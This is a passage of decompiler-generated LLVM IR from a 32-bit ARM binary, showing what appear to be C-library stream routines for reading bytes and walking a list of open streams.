  %v2_14a6c = inttoptr i32 %v1_14a6c to i32*
  %v3_14a6c = load i32, i32* %v2_14a6c, align 4
  %v2_14a70 = sub i32 %v3_14a6c, %v3_14a68
  %v2_14a74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14a74, i32* @r4, align 4
  ret i32 %v2_14a70

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_14a7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a7c:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14a7c = load i32, i32* @r4, align 4
  store i32 %v3_14a7c, i32* %stack_var_-16, align 4
  %v6_14a7c = load i32, i32* @r5, align 4
  %v12_14a7c = load i32, i32* @lr, align 4
  %v1_14a80 = add i32 %arg1, 52
  %v2_14a80 = inttoptr i32 %v1_14a80 to i32*
  %v3_14a80 = load i32, i32* %v2_14a80, align 4
  %v2_14a88 = icmp eq i32 %v3_14a80, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 124088, i32* %r6.global-to-local, align 4
  br i1 %v2_14a88, label %dec_label_pc_14ac0, label %dec_label_pc_14a9c

dec_label_pc_14a9c:                               ; preds = %dec_label_pc_14a7c
  %v1_14a9c = add i32 %arg1, 16
  %v2_14a9c = inttoptr i32 %v1_14a9c to i32*
  %v3_14a9c = load i32, i32* %v2_14a9c, align 4
  %v1_14aa0 = add i32 %arg1, 24
  %v2_14aa0 = inttoptr i32 %v1_14aa0 to i32*
  %v3_14aa0 = load i32, i32* %v2_14aa0, align 4
  %v3_14aa4 = icmp ult i32 %v3_14a9c, %v3_14aa0
  br i1 %v3_14aa4, label %.thread, label %dec_label_pc_14ab4

.thread:                                          ; preds = %dec_label_pc_14a9c
  %v2_14aa8 = inttoptr i32 %v3_14a9c to i8*
  %v3_14aa8 = load i8, i8* %v2_14aa8, align 1
  %v4_14aa8 = zext i8 %v3_14aa8 to i32
  store i32 %v4_14aa8, i32* %r4.global-to-local, align 4
  %v6_14aa8 = add i32 %v3_14a9c, 1
  store i32 %v6_14aa8, i32* %v2_14a9c, align 4
  br label %dec_label_pc_14b34

dec_label_pc_14ab4:                               ; preds = %dec_label_pc_14a9c
  %v1_14ab4 = inttoptr i32 %arg1 to i16*
  %v2_14ab4 = call i32 @function_14fa8(i16* %v1_14ab4)
  store i32 %v2_14ab4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b34

dec_label_pc_14ac0:                               ; preds = %dec_label_pc_14a7c
  %v1_14ac4 = add i32 %arg1, 56
  store i32 %v1_14ac4, i32* @r4, align 4
  %v4_14ad8 = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  call void @__pseudo_branch(i32 %v4_14ad8)
  %v0_14aec = load i32, i32* %r6.global-to-local, align 4
  %v2_14aec = add i32 %v0_14aec, 16
  %v3_14aec = inttoptr i32 %v2_14aec to i32*
  %v4_14aec = load i32, i32* %v3_14aec, align 4
  store i32 84728, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14aec)
  %v0_14af8 = load i32, i32* @r5, align 4
  %v1_14af8 = add i32 %v0_14af8, 16
  %v2_14af8 = inttoptr i32 %v1_14af8 to i32*
  %v3_14af8 = load i32, i32* %v2_14af8, align 4
  %v1_14afc = add i32 %v0_14af8, 24
  %v2_14afc = inttoptr i32 %v1_14afc to i32*
  %v3_14afc = load i32, i32* %v2_14afc, align 4
  %v3_14b00 = icmp ult i32 %v3_14af8, %v3_14afc
  br i1 %v3_14b00, label %.thread2, label %dec_label_pc_14b10

.thread2:                                         ; preds = %dec_label_pc_14ac0
  %v2_14b04 = inttoptr i32 %v3_14af8 to i8*
  %v3_14b04 = load i8, i8* %v2_14b04, align 1
  %v4_14b04 = zext i8 %v3_14b04 to i32
  store i32 %v4_14b04, i32* %r4.global-to-local, align 4
  %v6_14b04 = add i32 %v3_14af8, 1
  store i32 %v6_14b04, i32* %v2_14af8, align 4
  br label %dec_label_pc_14b1c

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14ac0
  %v1_14b14 = inttoptr i32 %v0_14af8 to i16*
  %v2_14b14 = call i32 @function_14fa8(i16* %v1_14b14)
  store i32 %v2_14b14, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b1c

dec_label_pc_14b1c:                               ; preds = %.thread2, %dec_label_pc_14b10
  %v0_14b28 = load i32, i32* %r6.global-to-local, align 4
  %v2_14b28 = add i32 %v0_14b28, 24
  %v3_14b28 = inttoptr i32 %v2_14b28 to i32*
  %v4_14b28 = load i32, i32* %v3_14b28, align 4
  store i32 %v4_14b28, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14b28)
  br label %dec_label_pc_14b34

dec_label_pc_14b34:                               ; preds = %.thread, %dec_label_pc_14ab4, %dec_label_pc_14b1c
  %v0_14b34 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b3c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14b3c, i32* @r4, align 4
  store i32 %v6_14a7c, i32* @r5, align 4
  store i32 %v12_14a7c, i32* @lr, align 4
  ret i32 %v0_14b34

; uselistorder directives
  uselistorder i32 %v3_14af8, { 1, 0, 2 }
  uselistorder i32 %v3_14a9c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 5, 0, 4, 3, 1, 2 }
  uselistorder label %dec_label_pc_14b34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14b1c, { 1, 0 }
}

define i32 @function_14b48(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b48:
  %v0_14b48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14b48, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14b48
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14b48, %bb
  %v10_14b54 = phi i32 [ %arg1, %dec_label_pc_14b48 ], [ 0, %bb ]
  ret i32 %v10_14b54

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14b58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14b58:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14b58 = load i32, i32* @r4, align 4
  store i32 %v3_14b58, i32* %stack_var_-28, align 4
  %v6_14b58 = load i32, i32* @r5, align 4
  %v9_14b58 = load i32, i32* @r6, align 4
  %v12_14b58 = load i32, i32* @r7, align 4
  %v21_14b58 = load i32, i32* @lr, align 4
  %v1_14b5c = add i32 %arg3, 52
  %v2_14b5c = inttoptr i32 %v1_14b5c to i32*
  %v3_14b5c = load i32, i32* %v2_14b5c, align 4
  %v1_14b64 = sub i32 1, %v3_14b5c
  %v2_14b64 = icmp ult i32 %v3_14b5c, 2
  br i1 %v2_14b64, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_14b58
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14b58, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14b64, %dec_label_pc_14b58 ]
  %v0_14b6c = phi i32 [ 0, %bb ], [ %v1_14b64, %dec_label_pc_14b58 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_14b6c = icmp eq i32 %v0_14b6c, 0
  store i32 124088, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_14b6c, label %dec_label_pc_14bc0, label %dec_label_pc_14b88

dec_label_pc_14b88:                               ; preds = %bb16
  %v1_14b8c = add i32 %arg3, 56
  store i32 %v1_14b8c, i32* @r4, align 4
  %v4_14ba0 = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  call void @__pseudo_branch(i32 %v4_14ba0)
  %v0_14bb4 = load i32, i32* @r5, align 4
  %v2_14bb4 = add i32 %v0_14bb4, 16
  %v3_14bb4 = inttoptr i32 %v2_14bb4 to i32*
  %v4_14bb4 = load i32, i32* %v3_14bb4, align 4
  store i32 %v4_14bb4, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14bc0.493 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14bb4)
  %v0_14bc0.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_14bc4.pre = load i32, i32* @r7, align 4
  %v0_14bc8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14bc0

dec_label_pc_14bc0:                               ; preds = %bb16, %dec_label_pc_14b88
  %v0_14bc8 = phi i32 [ %arg3, %bb16 ], [ %v0_14bc8.pre, %dec_label_pc_14b88 ]
  %v0_14bc4 = phi i32 [ %arg2, %bb16 ], [ %v0_14bc4.pre, %dec_label_pc_14b88 ]
  %v0_14bc0 = phi i32 [ %arg1, %bb16 ], [ %v0_14bc0.pre, %dec_label_pc_14b88 ]
  %v3_14bcc = inttoptr i32 %v0_14bc0 to i8*
  %v4_14bcc = call i32 @function_150d4(i8* %v3_14bcc, i32 %v0_14bc4, i32 %v0_14bc8)
  %v0_14bd0 = load i32, i32* %sl.global-to-local, align 4
  %v2_14bd0 = icmp eq i32 %v0_14bd0, 0
  store i32 %v4_14bcc, i32* %r4.global-to-local, align 4
  br i1 %v2_14bd0, label %dec_label_pc_14bc0..thread3_crit_edge, label %bb17

dec_label_pc_14bc0..thread3_crit_edge:            ; preds = %dec_label_pc_14bc0
  %v0_14bec.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_14bc0
  %v1_14be4 = load i32, i32* @r5, align 4
  %v3_14be4 = add i32 %v1_14be4, 24
  %v4_14be4 = inttoptr i32 %v3_14be4 to i32*
  %v5_14be4 = load i32, i32* %v4_14be4, align 4
  store i32 %v5_14be4, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14bc0..thread3_crit_edge, %bb17
  %v0_14bec = phi i32 [ %v0_14bec.pre, %dec_label_pc_14bc0..thread3_crit_edge ], [ %v5_14be4, %bb17 ]
  %v2_14bec = xor i1 %v2_14bd0, true
  call void @__pseudo_cond_branch(i1 %v2_14bec, i32 %v0_14bec)
  %v0_14bf0 = load i32, i32* %r4.global-to-local, align 4
  %v2_14bf8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14bf8, i32* %r4.global-to-local, align 4
  store i32 %v6_14b58, i32* @r5, align 4
  store i32 %v9_14b58, i32* @r6, align 4
  store i32 %v12_14b58, i32* @r7, align 4
  store i32 %v21_14b58, i32* @lr, align 4
  ret i32 %v0_14bf0

; uselistorder directives
  uselistorder i32 %v3_14b5c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 52, { 9, 10, 11, 12, 13, 3, 14, 7, 8, 4, 16, 17, 1, 18, 0, 19, 20, 5, 6, 15, 2 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14bc0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_14c04(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c04:
  %v0_14c04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c04, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14c04
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14c04, %bb
  %v10_14c10 = phi i32 [ %arg1, %dec_label_pc_14c04 ], [ 0, %bb ]
  ret i32 %v10_14c10

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14c14() local_unnamed_addr {
dec_label_pc_14c14:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14c14 = load i32, i32* @r4, align 4
  store i32 %v3_14c14, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r6.global-to-local, align 4
  %v4_14c24 = load i32, i32* inttoptr (i32 124124 to i32*), align 4
  store i32 %v4_14c24, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14c2c = load i32, i32* inttoptr (i32 124196 to i32*), align 4
  store i32 %v4_14c2c, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_14c38 = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  store i32 %v4_14c38, i32* %r7.global-to-local, align 4
  %v2_14c44 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_14c38)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14c58 = load i32, i32* %r6.global-to-local, align 4
  %v2_14c58 = add i32 %v0_14c58, 16
  %v3_14c58 = inttoptr i32 %v2_14c58 to i32*
  %v4_14c58 = load i32, i32* %v3_14c58, align 4
  store i32 %v4_14c58, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14c58)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_14c68 = load i32, i32* %r6.global-to-local, align 4
  %v2_14c68 = add i32 %v0_14c68, 12
  %v3_14c68 = inttoptr i32 %v2_14c68 to i32*
  %v4_14c68 = load i32, i32* %v3_14c68, align 4
  store i32 %v4_14c68, i32* %r3.global-to-local, align 4
  %v1_14c6c = inttoptr i32 %v4_14c68 to i32*
  %v2_14c6c = load i32, i32* %v1_14c6c, align 4
  store i32 %v2_14c6c, i32* %r3.global-to-local, align 4
  %v7_14c70 = icmp eq i32 %v2_14c6c, 1
  br i1 %v7_14c70, label %dec_label_pc_14c78, label %dec_label_pc_14d38

dec_label_pc_14c78:                               ; preds = %dec_label_pc_14c14
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_14c7c = add i32 %v0_14c68, 48
  %v3_14c7c = inttoptr i32 %v2_14c7c to i32*
  %v4_14c7c = load i32, i32* %v3_14c7c, align 4
  store i32 %v4_14c7c, i32* %r3.global-to-local, align 4
  %v1_14c80 = inttoptr i32 %v4_14c7c to i32*
  %v2_14c80 = load i32, i32* %v1_14c80, align 4
  store i32 %v2_14c80, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_14c80, 1
  br i1 %tmp30, label %dec_label_pc_14d38, label %dec_label_pc_14c8c

dec_label_pc_14c8c:                               ; preds = %dec_label_pc_14c78
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_14c90 = add i32 %v0_14c68, 96
  %v3_14c90 = inttoptr i32 %v2_14c90 to i32*
  %v4_14c90 = load i32, i32* %v3_14c90, align 4
  store i32 %v4_14c90, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14c38)
  call void @__pseudo_branch(i32 %v4_14c58)
  %v0_14cb8 = load i32, i32* %r6.global-to-local, align 4
  %v2_14cb8 = add i32 %v0_14cb8, 44
  %v3_14cb8 = inttoptr i32 %v2_14cb8 to i32*
  %v4_14cb8 = load i32, i32* %v3_14cb8, align 4
  store i32 %v4_14cb8, i32* %r3.global-to-local, align 4
  %v1_14cbc = inttoptr i32 %v4_14cb8 to i32*
  %v2_14cbc = load i32, i32* %v1_14cbc, align 4
  store i32 %v2_14cbc, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_14d0811 = icmp eq i32 %v2_14cbc, 0
  br i1 %v2_14d0811, label %dec_label_pc_14d14, label %dec_label_pc_14ccc

dec_label_pc_14ccc:                               ; preds = %dec_label_pc_14c8c, %dec_label_pc_14d04
  %v0_14cf02 = phi i32 [ %v0_14d04, %dec_label_pc_14d04 ], [ %v2_14cbc, %dec_label_pc_14c8c ]
  %v1_14ccc = inttoptr i32 %v0_14cf02 to i16*
  %v2_14ccc = load i16, i16* %v1_14ccc, align 2
  %v3_14ccc = zext i16 %v2_14ccc to i32
  store i32 %v3_14ccc, i32* %r3.global-to-local, align 4
  %v2_14cd0 = and i32 %v3_14ccc, 32816
  %v7_14cd4 = icmp eq i32 %v2_14cd0, 48
  %v1_14cd8 = add i32 %v0_14cf02, 32
  %v2_14cd8 = inttoptr i32 %v1_14cd8 to i32*
  %v3_14cd8 = load i32, i32* %v2_14cd8, align 4
  store i32 %v3_14cd8, i32* %r5.global-to-local, align 4
  br i1 %v7_14cd4, label %dec_label_pc_14ce4, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_14ccc
  store i32 %v0_14cf02, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d04

dec_label_pc_14ce4:                               ; preds = %dec_label_pc_14ccc
  %v0_14ce4 = load i32, i32* %r7.global-to-local, align 4
  %v2_14ce4 = icmp eq i32 %v0_14ce4, 0
  br i1 %v2_14ce4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14ce4
  %v1_14ce8 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ce8 = load i32, i32* %r8.global-to-local, align 4
  %v3_14ce8 = add i32 %v2_14ce8, %v1_14ce8
  %v4_14ce8 = inttoptr i32 %v3_14ce8 to i32*
  %v5_14ce8 = load i32, i32* %v4_14ce8, align 4
  store i32 %v5_14ce8, i32* %r3.global-to-local, align 4
  %v3_14cec = inttoptr i32 %v5_14ce8 to i32*
  store i32 %v3_14cd8, i32* %v3_14cec, align 4
  %v0_14cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14cf0 = inttoptr i32 %v0_14cf0 to i16*
  %v2_14cf0 = load i16, i16* %v1_14cf0, align 2
  %v3_14cf0 = zext i16 %v2_14cf0 to i32
  store i32 %v3_14cf0, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_14ce4
  %v2_14cf08 = load i16, i16* %v1_14ccc, align 2
  %v3_14cf09 = zext i16 %v2_14cf08 to i32
  store i32 %v3_14cf09, i32* %r3.global-to-local, align 4
  %v3_14cf4 = add i32 %v0_14ce4, 32
  %v4_14cf4 = inttoptr i32 %v3_14cf4 to i32*
  store i32 %v3_14cd8, i32* %v4_14cf4, align 4
  %v0_14cf8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_14cf8 = phi i32 [ %v3_14cf0, %.thread ], [ %v0_14cf8.pre, %bb ]
  %v1_14cf8 = and i32 %v0_14cf8, 8192
  %v2_14cf8 = icmp eq i32 %v1_14cf8, 0
  br i1 %v2_14cf8, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_14d00 = xor i1 %v2_14cf8, true
  call void @__pseudo_cond_branch(i1 %v1_14d00, i32 ptrtoint (i32* @global_var_12670.21 to i32))
  %v0_14d04.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14d04

dec_label_pc_14d04:                               ; preds = %.thread21, %bb33
  %v0_14d04 = phi i32 [ %v0_14d04.pre, %bb33 ], [ %v3_14cd8, %.thread21 ]
  store i32 %v0_14d04, i32* %r4.global-to-local, align 4
  %v2_14d08 = icmp eq i32 %v0_14d04, 0
  br i1 %v2_14d08, label %dec_label_pc_14d08.dec_label_pc_14d14_crit_edge, label %dec_label_pc_14ccc

dec_label_pc_14d08.dec_label_pc_14d14_crit_edge:  ; preds = %dec_label_pc_14d04
  %v0_14d20.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14d14

dec_label_pc_14d14:                               ; preds = %dec_label_pc_14d08.dec_label_pc_14d14_crit_edge, %dec_label_pc_14c8c
  %v0_14d20 = phi i32 [ %v0_14d20.pre, %dec_label_pc_14d08.dec_label_pc_14d14_crit_edge ], [ %v0_14cb8, %dec_label_pc_14c8c ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_14d20 = add i32 %v0_14d20, 24
  %v3_14d20 = inttoptr i32 %v2_14d20 to i32*
  %v4_14d20 = load i32, i32* %v3_14d20, align 4
  call void @__pseudo_branch(i32 %v4_14d20)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_14d30 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d30 = add i32 %v0_14d30, 48
  %v3_14d30 = inttoptr i32 %v2_14d30 to i32*
  %v4_14d30 = load i32, i32* %v3_14d30, align 4
  store i32 %v4_14d30, i32* %r3.global-to-local, align 4
  %v0_14d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_14d34 = inttoptr i32 %v4_14d30 to i32*
  store i32 %v0_14d34, i32* %v2_14d34, align 4
  %v0_14d3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14d38

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14c14, %dec_label_pc_14c78, %dec_label_pc_14d14
  %v0_14d3c = phi i32 [ %v0_14c68, %dec_label_pc_14c14 ], [ %v0_14c68, %dec_label_pc_14c78 ], [ %v0_14d3c.pre, %dec_label_pc_14d14 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14d3c = add i32 %v0_14d3c, 12
  %v3_14d3c = inttoptr i32 %v2_14d3c to i32*
  %v4_14d3c = load i32, i32* %v3_14d3c, align 4
  %v1_14d40 = inttoptr i32 %v4_14d3c to i32*
  %v2_14d40 = load i32, i32* %v1_14d40, align 4
  %v1_14d44 = add i32 %v2_14d40, -1
  store i32 %v1_14d44, i32* %v1_14d40, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_14d58 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d58 = add i32 %v0_14d58, 24
  %v3_14d58 = inttoptr i32 %v2_14d58 to i32*
  %v4_14d58 = load i32, i32* %v3_14d58, align 4
  call void @__pseudo_branch(i32 %v4_14d58)
  %v2_14d68 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14d68, i32* %r4.global-to-local, align 4
  ret i32 %v2_14c44

; uselistorder directives
  uselistorder i32 %v0_14d04, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* inttoptr (i32 124124 to i32*), { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14d38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d04, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_14ccc, { 1, 0 }
}

define i32 @function_14d74(i16* %arg1) local_unnamed_addr {
dec_label_pc_14d74:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_14d74 = load i1, i1* @cpsr_z, align 1
  %v2_14d74 = load i32, i32* @r4, align 4
  br i1 %v0_14d74, label %bb, label %dec_label_pc_14d74..thread8_crit_edge

dec_label_pc_14d74..thread8_crit_edge:            ; preds = %dec_label_pc_14d74
  %v0_14db0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_14d74
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14d74..thread8_crit_edge, %bb
  %v0_14f50 = phi i32 [ %v0_14db0.pre, %dec_label_pc_14d74..thread8_crit_edge ], [ 0, %bb ]
  store i32 %v2_14d74, i32* %stack_var_-36, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %sb.global-to-local, align 4
  %v4_14dac = load i32, i32* inttoptr (i32 124132 to i32*), align 4
  store i32 %v4_14dac, i32* %r3.global-to-local, align 4
  %v9_14db0 = icmp eq i32 %v0_14f50, %v4_14dac
  store i32 %v0_14f50, i32* %fp.global-to-local, align 4
  br i1 %v9_14db0, label %bb49, label %dec_label_pc_14dc8

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14dd8

dec_label_pc_14dc8:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_14dcc = icmp eq i32 %v0_14f50, 0
  br i1 %v2_14dcc, label %dec_label_pc_14dd8, label %dec_label_pc_14f40

dec_label_pc_14dd8:                               ; preds = %bb49, %dec_label_pc_14dc8
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_14dc8 ]
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_14dec = load i32, i32* inttoptr (i32 124196 to i32*), align 4
  store i32 %v4_14dec, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_14df4 = ptrtoint i32* %stack_var_-56 to i32
  %v4_14df8 = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v2_14df4, i32* %r0.global-to-local, align 4
  store i32 %v4_14dec, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14df8)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14e18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14e18, i32* %r0.global-to-local, align 4
  %v0_14e1c = load i32, i32* %sb.global-to-local, align 4
  %v2_14e1c = add i32 %v0_14e1c, 16
  %v3_14e1c = inttoptr i32 %v2_14e1c to i32*
  %v4_14e1c = load i32, i32* %v3_14e1c, align 4
  call void @__pseudo_branch(i32 %v4_14e1c)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14e2c = add i32 %v0_14e1c, 12
  %v3_14e2c = inttoptr i32 %v2_14e2c to i32*
  %v4_14e2c = load i32, i32* %v3_14e2c, align 4
  store i32 %v4_14e2c, i32* %r2.global-to-local, align 4
  %v1_14e30 = inttoptr i32 %v4_14e2c to i32*
  %v2_14e30 = load i32, i32* %v1_14e30, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_14e38 = add i32 %v2_14e30, 1
  store i32 %v1_14e38, i32* %r3.global-to-local, align 4
  %v2_14e3c = add i32 %v0_14e1c, 24
  %v3_14e3c = inttoptr i32 %v2_14e3c to i32*
  %v4_14e3c = load i32, i32* %v3_14e3c, align 4
  store i32 %v1_14e38, i32* %v1_14e30, align 4
  store i32 %v2_14df4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e3c)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_14e58 = load i32, i32* %sb.global-to-local, align 4
  %v2_14e58 = add i32 %v0_14e58, 96
  %v3_14e58 = inttoptr i32 %v2_14e58 to i32*
  %v4_14e58 = load i32, i32* %v3_14e58, align 4
  store i32 %v4_14e58, i32* @r4, align 4
  store i32 %v4_14e58, i32* %r2.global-to-local, align 4
  store i32 %v2_14df4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14df8)
  %v0_14e70 = load i32, i32* @r4, align 4
  store i32 %v0_14e70, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e1c)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14e80 = load i32, i32* %sb.global-to-local, align 4
  %v2_14e80 = add i32 %v0_14e80, 44
  %v3_14e80 = inttoptr i32 %v2_14e80 to i32*
  %v4_14e80 = load i32, i32* %v3_14e80, align 4
  store i32 %v4_14e80, i32* %r3.global-to-local, align 4
  store i32 %v2_14df4, i32* %r0.global-to-local, align 4
  %v1_14e8c = inttoptr i32 %v4_14e80 to i32*
  %v2_14e8c = load i32, i32* %v1_14e8c, align 4
  store i32 %v2_14e8c, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_14e3c)
  %v0_14e98 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14e98, i32* @r6, align 4
  %v2_14e9c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_14e9c, i32* @r8, align 4
  store i32 72, i32* %fp.global-to-local, align 4
  %v0_14f30.pr = load i32, i32* @r7, align 4
  %v2_14f3028 = icmp eq i32 %v0_14f30.pr, 0
  br i1 %v2_14f3028, label %dec_label_pc_14f38, label %dec_label_pc_14ea4

dec_label_pc_14ea4:                               ; preds = %dec_label_pc_14dd8, %dec_label_pc_14f2c
  %v0_14eb0 = phi i32 [ %v3_14f2c, %dec_label_pc_14f2c ], [ %v0_14f30.pr, %dec_label_pc_14dd8 ]
  %v1_14ea4 = inttoptr i32 %v0_14eb0 to i16*
  %v2_14ea4 = load i16, i16* %v1_14ea4, align 2
  %v3_14ea4 = zext i16 %v2_14ea4 to i32
  store i32 %v3_14ea4, i32* %r3.global-to-local, align 4
  %v1_14ea8 = and i32 %v3_14ea4, 64
  %v2_14ea8 = icmp eq i32 %v1_14ea8, 0
  br i1 %v2_14ea8, label %dec_label_pc_14f2c, label %dec_label_pc_14eb0

